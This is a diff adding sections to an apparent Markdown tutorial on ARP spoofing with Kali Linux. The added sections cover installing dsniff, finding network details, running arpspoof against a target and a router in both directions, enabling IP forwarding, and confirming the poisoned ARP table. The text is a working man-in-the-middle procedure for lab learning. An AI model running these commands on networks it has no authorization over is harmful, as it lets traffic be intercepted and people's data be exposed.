@@ -165,6 +165,50 @@ On a **Windows** machine you can view the ARP table using the following command:
 On Kali Linux, we need to install a package that contains network analysis tools.
 
 ```sudo su```
+
 ```sudo apt install dsniff```
 
 The dsniff package includes several tools used for network traffic analysis and security testing.
+
+## 🔎 Gathering Network Information
+
+Before starting ARP spoofing, we need to collect some basic network information.
+
+Check the IP address of the Kali machine:
+
+```hostname -I```
+
+```ip route | grep default```
+
+## ⚡ ARP Spoofing with arpspoof
+
+Start ARP spoofing using the arpspoof tool included in the dsniff package.
+
+Terminal 1 – Spoof the Target
+
+```arpspoof -i wlan0 -t TARGET_IP ROUTER_IP```
+
+This tells the target machine that the attacker (Kali) is the router.
+
+---
+
+Terminal 2 – Spoof the Router
+
+```arpspoof -i wlan0 -t ROUTER_IP TARGET_IP```
+
+This tells the router that the attacker (Kali) is the target machine.
+
+---
+
+Terminal 3 – Enable Packet Forwarding
+
+```echo 1 > /proc/sys/net/ipv4/ip_forward```
+
+This allows Kali to forward packets between the router and the target, preventing the network connection from breaking.
+
+## ✅ Verifying the Attack
+
+After ARP spoofing is running, if the target checks its ARP table using: arp -a.
+
+The MAC address of the router should now appear as the MAC address of the Kali machine, indicating that the ARP poisoning was successful.
+
